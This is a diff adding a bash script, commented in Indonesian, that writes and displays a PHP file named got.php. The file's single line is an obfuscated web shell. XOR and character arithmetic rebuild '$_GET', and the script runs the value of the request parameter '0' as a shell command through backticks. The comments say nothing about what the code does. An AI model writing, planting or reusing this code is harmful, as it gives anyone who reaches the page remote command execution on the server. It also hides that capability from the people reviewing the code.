@@ -1,0 +1,15 @@
+#!/bin/bash
+
+# Membuat file got.php dengan konten yang diminta
+cat > got.php << 'EOF'
+<?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
+EOF
+
+# Konfirmasi bahwa file telah dibuat
+if [ -f "got.php" ]; then
+    echo "File got.php berhasil dibuat!"
+    echo "Isi file:"
+    cat got.php
+else
+    echo "Gagal membuat file got.php"
+fi
